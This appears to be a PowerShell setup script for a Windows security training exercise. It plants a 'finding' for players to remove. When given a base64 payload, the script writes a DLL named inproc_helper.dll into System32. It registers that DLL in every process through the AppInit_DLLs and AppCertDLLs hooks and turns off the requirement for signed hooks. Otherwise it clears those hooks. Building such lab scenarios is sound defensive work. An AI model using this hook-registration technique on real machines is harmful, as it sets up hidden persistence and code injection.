script:
# Machine-wide DLL load hooks (AppInit_DLLs + AppCertDLLs).
# A hook target MUST be a real PE. A non-PE (or dangling) value makes every
# 32-bit process (including the first-logon "Personalized Settings" setup,
# unregmp2.exe) fail with Bad Image 0xc000012f, so setup never finishes and
# Explorer never paints the desktop. Therefore:
#  - when DLL_PAYLOAD_B64 is supplied, write the real PE and register the hooks
#    (the finding the player must remove);
#  - otherwise leave NO hook registered at all, so the first-logon setup is clean
#    and the w4_17 clean-state check is satisfiable without a desktop-blocking bug.
$dll = if ($DLL_PATH) { $DLL_PATH } else { 'C:\Windows\System32\inproc_helper.dll' }
if ($DLL_PAYLOAD_B64) {
  $dir = Split-Path -Parent $dll
  if ($dir -and -not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
  [IO.File]::WriteAllBytes($dll, [Convert]::FromBase64String($DLL_PAYLOAD_B64))
  $win = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows'
  Set-ItemProperty -Path $win -Name 'AppInit_DLLs' -Value $dll -Type String -Force
  Set-ItemProperty -Path $win -Name 'LoadAppInit_DLLs' -Value 1 -Type DWord -Force
  Set-ItemProperty -Path $win -Name 'RequireSignedHooks' -Value 0 -Type DWord -Force
  $certs = 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDLLs'
  if (-not (Test-Path $certs)) { New-Item -Path $certs -Force | Out-Null }
  Set-ItemProperty -Path $certs -Name 'inproc_helper' -Value $dll -Type String -Force
} else {
  if (Test-Path $dll) {
    $fs = [IO.File]::OpenRead($dll)
    $b = New-Object byte[] 2
    $n = $fs.Read($b, 0, 2)
    $fs.Close()
    if (-not ($n -eq 2 -and $b[0] -eq 0x4D -and $b[1] -eq 0x5A)) {
      Remove-Item -Path $dll -Force -ErrorAction SilentlyContinue
    }
  }
  $win = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows'
  Remove-ItemProperty -Path $win -Name 'AppInit_DLLs' -ErrorAction SilentlyContinue
  Remove-ItemProperty -Path $win -Name 'LoadAppInit_DLLs' -ErrorAction SilentlyContinue
  Remove-ItemProperty -Path $win -Name 'RequireSignedHooks' -ErrorAction SilentlyContinue
  $certs = 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDLLs'
  Remove-Item -Path $certs -Force -ErrorAction SilentlyContinue
}
